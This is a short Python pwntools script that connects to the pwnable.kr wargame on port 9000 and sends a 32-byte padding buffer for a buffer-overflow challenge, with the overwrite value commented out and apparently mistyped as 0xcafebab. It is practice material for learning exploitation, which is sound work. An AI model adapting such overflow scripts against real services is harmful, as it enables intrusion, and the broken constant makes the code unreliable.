import pwn
r=pwn.remote('pwnable.kr', 9000)
buf='x'*32
#buf+=pwn.p32(0xcafebab)
r.send(buf.encode())
print(r.recvn(14))
